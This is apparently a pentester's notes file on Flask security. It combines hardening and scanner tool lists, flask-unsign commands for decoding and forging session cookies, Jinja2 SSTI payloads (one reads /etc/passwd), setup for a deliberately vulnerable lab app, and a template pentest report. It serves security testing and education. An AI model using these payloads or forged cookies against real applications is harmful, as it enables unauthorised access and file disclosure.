
##
#
https://medium.com/swlh/hacking-flask-applications-939eae4bffed
#
##


## Web Framework Hardening

- [Secure.py](https://github.com/cakinney/secure.py) - secure.py ðŸ”’ is a lightweight package that adds optional security headers and cookie attributes for Python web frameworks.
- [Flask-HTTPAuth](https://github.com/miguelgrinberg/flask-httpauth/) - Simple extension that provides Basic, Digest and Token HTTP authentication for Flask routes.
- [Flask Talisman](https://github.com/GoogleCloudPlatform/flask-talisman) - Talisman is a small Flask extension that handles setting HTTP headers that can help protect against a few common web application security issues.
- [Django Session CSRF](https://github.com/mozilla/django-session-csrf) - CSRF protection for Django without cookies.

## Multi tools

- [hawkeye](https://github.com/hawkeyesec/scanner-cli) - Multi purpose security/vulnerability/risk scanning tool supporting Ruby, Node.js, Python, PHP and Java.
- [GuardRails](https://github.com/apps/guardrails) - A GitHub App that gives you instant security feedback in your Pull Requests.
- [Hubble](https://github.com/hubblestack/hubble) - Hubble is a modular, open-source security compliance framework.
- [Salus](https://github.com/coinbase/salus) - Multi purpose security scanning tool supporting Ruby, Node, Python and Go.

## Static Code Analysis

- [Bandit](https://github.com/PyCQA/bandit) - Bandit is a tool designed to find common security issues in Python code.
- [Pyt](https://github.com/python-security/pyt) - A Static Analysis Tool for Detecting Security Vulnerabilities in Python Web Applications.
- [Detect Secrets](https://libraries.io/pypi/detect-secrets) - An enterprise friendly way of detecting and preventing secrets in code.

## Vulnerabilities and Security Advisories

- [Safety](https://github.com/pyupio/safety) - Safety checks your installed dependencies for known security vulnerabilities.
- [snyk Vulnerability DB](https://snyk.io/vuln?type=pip) - Commercial but free listing of known vulnerabilities in libraries.
- [Common Vulnerabilities and Exposures](https://www.cvedetails.com/vulnerability-list/vendor_id-10210/product_id-18230/Python-Python.html) - Vulnerabilities that were assigned a CVE. Covers the language and packages.
- [National Vulnerability Database](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=python&search_type=all) - Python known vulnerabilities in the National Vulnerability Database.
- 
```

# https://github.com/Paradoxis/Flask-Unsign

```
pip3 install flask-unsign
flask-unsign
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
flask-unsign --decode --server 'https://www.example.com/login'
flask-unsign --unsign --cookie < cookie.txt
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

# Python Flask SSTI Payloads and tricks

* {{url_for.globals}}
* {{request.environ}}
* {{config}}
* {{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}
* {{self}}
* request|attr('class') == request.class == request[\x5f\x5fclass\x5f\x5f]      
```

Vulnerable-Flask-App
Erlik 2 - Vulnerable-Flask-App

Tested - Kali 2022.1

```
Description
It is a vulnerable Flask Web App. It is a lab environment created for people who want to improve themselves in the field of web penetration testing.

Features
It contains the following vulnerabilities.

-HTML Injection

-XSS

-SSTI

-SQL Injection

-Information Disclosure

-Command Injection

-Brute Force

-Deserialization

-Broken Authentication

-DOS

-File Upload

Installation
git clone https://github.com/anil-yelken/Vulnerable-Flask-App

cd Vulnerable-Flask-App

sudo pip3 install -r requirements.txt

Usage
python3 vulnerable-flask-app.py
```


Contact
https://twitter.com/anilyelken06

https://medium.com/@anilyelken



######
######

Pentest Report for [Application Name]
Summary
In this report, we present the findings of a penetration test conducted on the [Application Name] Flask application. The goal of this test was to identify any vulnerabilities or weaknesses that could be exploited by an attacker.

Methodology
The test was conducted using a combination of automated and manual techniques. Automated tools were used to scan for common vulnerabilities, such as SQL injection and cross-site scripting (XSS). Manual testing was performed to identify more complex vulnerabilities and to verify the results of the automated scans.

Findings
High Severity Issues
Issue 1: SQL Injection
Description
We identified a SQL injection vulnerability in the login functionality of the application. An attacker could exploit this vulnerability to bypass authentication and gain unauthorized access to the application's database.

Recommendation
We recommend that the application's developers implement parameterized queries to prevent SQL injection attacks.

Issue 2: Cross-Site Scripting (XSS)
Description
We identified a reflected XSS vulnerability in the search functionality of the application. An attacker could exploit this vulnerability to execute malicious scripts in the context of a victim's browser.

Recommendation
We recommend that the application's developers sanitize user input and encode output to prevent XSS attacks.

Medium Severity Issues
Issue 1: Session Fixation
Description
We identified a session fixation vulnerability in the application. An attacker could exploit this vulnerability to hijack a victim's session and gain unauthorized access to the application.

Recommendation
We recommend that the application's developers regenerate session IDs upon authentication.

Issue 2: Insecure Communications
Description
We identified that the application is not using HTTPS to encrypt communications. This could allow an attacker to intercept and modify traffic, including authentication credentials.

Recommendation
We recommend that the application's developers implement HTTPS to secure communications.

Low Severity Issues
Issue 1: Information Leakage
Description
We identified that error messages are disclosing sensitive information, including database and server names.

Recommendation
We recommend that the application's developers review error handling and remove any sensitive information from error messages.

Conclusion
Overall, we identified several vulnerabilities in the [Application Name] Flask application, including a SQL injection vulnerability and a reflected XSS vulnerability. We recommend that the application's developers address these vulnerabilities to prevent potential attacks. Additionally, we recommend that the application's developers review and improve the application's security posture to prevent similar vulnerabilities in the future


#############
#############
